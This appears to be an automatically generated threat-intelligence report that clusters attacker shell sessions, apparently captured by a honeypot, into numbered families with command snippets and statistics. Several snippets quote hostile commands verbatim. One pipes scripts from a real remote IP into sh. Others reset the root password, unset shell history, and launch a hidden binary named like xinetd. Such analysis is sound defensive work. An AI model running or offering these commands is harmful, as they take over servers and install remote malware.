| 59111258620bd04f | 2495304db2b6 |       11 |               1 |

---

## Family 30

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6408dd96663ab7e9` (Session: `182ef5249f2b`, n_rows=15)

**Medoid Execution Snippet:**
```text
echo "root:O6qiXSZcr6tl"|chpasswd|bash
cat /proc/cpuinfo | grep name | wc -l
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
which ls
ls -lh $(which ls)
crontab -l
w
cat /proc/cpuinfo | grep model | grep name | wc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('which', ';'), ('ls', ';'), ('crontab', ';'), ('w', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('uname', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 6), ('cat', 3), ('uname', 3), ('echo', 2), ('wc', 2), ('awk', 2), ('cd', 2), ('chpasswd', 1), ('bash', 1), ('free', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6408dd96663ab7e9 | 182ef5249f2b |       15 |               1 |

---

## Family 14

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `81fc3d1d8ff117d0` (Session: `6826c00fab2d`, n_rows=15)

**Medoid Execution Snippet:**
```text
echo "root:IJBFVRppBGj8"|chpasswd|bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
cat /proc/cpuinfo | g ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 6), ('cat', 3), ('uname', 3), ('echo', 2), ('awk', 2), ('wc', 2), ('cd', 2), ('chpasswd', 1), ('bash', 1), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 81fc3d1d8ff117d0 | 6826c00fab2d |       15 |               1 |

---

## Family 24

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8800da8513b21bb2` (Session: `3f8e66641459`, n_rows=2)

**Medoid Execution Snippet:**
```text
ls
uname -a
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', ';'), ('uname', 'EOS')]`

Top operators: [('ls', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8800da8513b21bb2 | 3f8e66641459 |        2 |               1 |

---

## Family 13

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9823047ab95dbd47` (Session: `04f03751c361`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -e '\x67\x61\x79\x66\x67\x74'
echo -e '\x67\x61\x79\x66\x67\x74'
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9823047ab95dbd47 | 04f03751c361 |        2 |               1 |

---

## Family 8

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9c44d7df2a9c16dd` (Session: `a3276863f63c`, n_rows=1)

**Medoid Execution Snippet:**
```text
ls
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', 'EOS')]`

Top operators: [('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9c44d7df2a9c16dd | a3276863f63c |        1 |               1 |

---

## Family 34

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9d3954c1d9a24fe0` (Session: `052385f8e8a7`, n_rows=5)

**Medoid Execution Snippet:**
```text
wget -qO - http://147.231.19.62/.x/1sh | sh > /dev/null 2>&1 &
rm -rf /var/run/1sh; wget -c http://147.231.19.62/.x/1sh -P /var/run && sh /var/run/1sh &
wget -qO - http://147.231.19.62/.x/2sh | sh > /dev/null 2>&1 &
rm -rf /tmp/2sh; wget -c http://147.231.19.62/.x/2sh -P /tmp && sh /tmp/2sh &
curl h ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]`

Top operators: [('sh', 5), ('wget', 4), ('rm', 2), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9d3954c1d9a24fe0 | 052385f8e8a7 |        5 |               1 |

---

## Family 11

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e6ba26d16136b21d` (Session: `8e876dc0f982`, n_rows=1)

**Medoid Execution Snippet:**
```text
unset HISTFILE ; unset HISTSIZE
```

**Consensus Skeleton (op, conn pairs):**
`[('unset', ';'), ('unset', 'EOS')]`

Top operators: [('unset', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e6ba26d16136b21d | 8e876dc0f982 |        1 |               1 |

---

## Family 15

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e90a9ab1b9baedc3` (Session: `9f4723f95b00`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', 'EOS')]`

Top operators: [('cat', 1), ('grep', 1), ('wc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e90a9ab1b9baedc3 | 9f4723f95b00 |        1 |               1 |

---

## Family 10

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ea19e5a56a722ab2` (Session: `27e14aead7e8`, n_rows=1)

**Medoid Execution Snippet:**
```text
chmod +x ./.824246358726410726/xinetd;nohup ./.824246358726410726/xinetd  &
```

**Consensus Skeleton (op, conn pairs):**
`[('chmod', ';'), ('nohup', 'EOS')]`

Top operators: [('chmod', 1), ('nohup', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ea19e5a56a722ab2 | 27e14aead7e8 |        1 |               1 |

---

## Family 16

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `eb0391dcf86d6035` (Session: `5ababb507f24`, n_rows=18)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
Enter new UNIX password: 
Enter new UNIX password:
echo "admin123456\nB1Tjc7Pc7p4g\nB1Tjc7Pc7p4g\n"|passwd
echo -e "admin123456\nB1Tjc7Pc7p4g\nB1Tjc7Pc7p4g"|passwd|bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep M ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('Enter', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('top', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 6), ('cat', 3), ('echo', 3), ('uname', 3), ('wc', 2), ('Enter', 2), ('passwd', 2), ('awk', 2), ('cd', 2), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| eb0391dcf86d6035 | 5ababb507f24 |       18 |               1 |

---
